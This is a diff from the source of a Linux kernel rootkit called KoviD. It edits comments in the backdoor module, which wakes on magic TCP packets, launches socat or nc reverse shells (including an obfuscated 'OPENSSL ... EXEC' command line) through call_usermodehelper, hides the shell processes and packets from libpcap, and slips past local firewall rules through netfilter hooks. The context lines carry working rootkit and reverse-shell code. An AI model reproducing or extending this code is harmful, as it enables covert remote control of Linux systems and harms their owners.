@@ -49,9 +49,9 @@ struct stat_ops_t {
      * Larger than needed but
      * then I haven't decided yet
      * how many possible locations
-     * we'll search, or even if
+     * we'll search for, or even if
      * that could be somehow set in
-     * runtime or whatever...
+     * runtime or something
      */
     const char *bin[BD_PATH_NUM];
 };
@@ -155,7 +155,7 @@ static inline bool *_is_task_fw_bypass_running(void) {
 }
 
 /**
- * Callback used to retrieve parent's PID
+ * Callback used for retrieving parent's PID
  */
 static int _retrieve_pid_cb(struct subprocess_info *info, struct cred *new) {
     if (info && info->data) {
@@ -184,8 +184,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                 {
                     /**
                      * same as RR_SOCAT but on dst port RR_SOCAT_TTY
-                     * Note: tail session is hidden automatically as it
-                     * will be direct child of socat
+                     * XXX: remove this lame obfuscation
                      */
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
                     char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
@@ -328,15 +327,14 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
 
     argv[2] = rev;
 
-    /* Initiate a new one */
     if ((info = call_usermodehelper_setup(argv[0], argv, envp,
                     GFP_KERNEL, _retrieve_pid_cb, NULL, &shellpid))) {
         ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
     }
 
     /*
-     * Allow some time so children can born
-     * and tell about new parent PID
+     * wait a little while before the
+     * children are ready and inform about new parent PID
      * */
     msleep(100);
 
@@ -345,7 +343,6 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     }
 
     if (select == RR_OPENSSL) {
-        /** force removal of fifo regardless , duplex will be fine... */
         // /tmp/.stfu
         char *a = kv_whatever_copystr(_OBF_TMP, sizeof(_OBF_TMP));
         char *b = kv_whatever_copystr(_OBF__STFU, sizeof(_OBF__STFU));
@@ -394,22 +391,22 @@ bool kv_bd_established(__be32 *daddr, int dport, bool established) {
 
     list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
         /**
-         * Stored saddr is done at the moment the magic packets are
-         * received by our pre-routing netfilter hook.
-         * The client sends a packet is special flags set and source address
+         * Storing saddr is done at the moment the magic packets are
+         * received by pre-routing netfilter hook.
+         * The client sends a packet with special flags set and source address
          * is the hint that says: connect to this address and port.
          *
          * That will trigger a local application, socat, nc, etc that will
-         * attempr to connect to that particular address:port. When that happens
+         * attempt to connect to that particular address:port. When that happens
          * we'll hook those packets in our local out netfilter hook and check
          * the matching here. Packets coming to local out filter will be destined
          * to the same address:port set in pre-routing, but this time they are
-         * daddr:dport, hence the inverted check you see here.
+         * daddr:dport, hence the swapped check you see here.
          */
         if (node->iph->saddr == *daddr && htons(node->tcph->source) ==  dport) {
             /**
              * Make sure to mark established only once per-connection so
-             * they will not loose estate.
+             * they will not loose state.
              * This will make internal references to be kept until
              * connections are closed by clients, when tasks will be unhidden, data
              * freed and the reverse shell(s) killed.
@@ -443,7 +440,7 @@ void kv_bd_cleanup_item(__be32 *saddr) {
 /**
  * Can be used in two distinct scenarios:
  *  1 - to remove one single address node if force == false
- *  2 - to clean up all otherwise
+ *  2 - to otherwise, clean everything
  */
 void _bd_cleanup(bool force) {
     struct iph_node_t *node, *node_safe;
@@ -560,7 +557,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
                 /** setup data so can be read from backdoor code */
                 _put_fifo(kf);
 
-                /* Make sure we won't show up in libcap */
+                /* Make sure we don't show in libcap */
                 _bd_add_new_iph(iph, tcph);
 
                 user = (struct nf_priv*)priv;
@@ -579,7 +576,6 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 }
 
 /**
- * This a magic place.
  * Let's suppose the target has a local netfiler rule similar to the following:
  *
  *  target     prot opt source               destination
@@ -634,8 +630,7 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
                  * sk_state carries current connection state of the packet, at this point in time.
                  * What I look for here are for TCP_ESTABLISHED packets that will tell me that, well,
                  * the connection has been completed, therefore that indicates that I can keep the
-                 * state and addresses for this connection, that will likely flow from now on, until
-                 * the either endpoint is closed.
+                 * state and addresses for this connection.
                  *
                  * The established state will only be recorded the first time it comes here and
                  * are kept throughout backdoor's lifetime.
@@ -752,8 +747,8 @@ void kv_sock_stop_fw_bypass(void) {
      * Established connections are kept in
      * iph_node until one of them terminates, or
      * KoviD is unloaded. Key here is to always make
-     * sure if one BD client exists, all remaining ones
-     * are kicked-out too.
+     * sure if one BD client exits, all remaining ones
+     * are terminated too.
      */
     _bd_cleanup(true);
 }
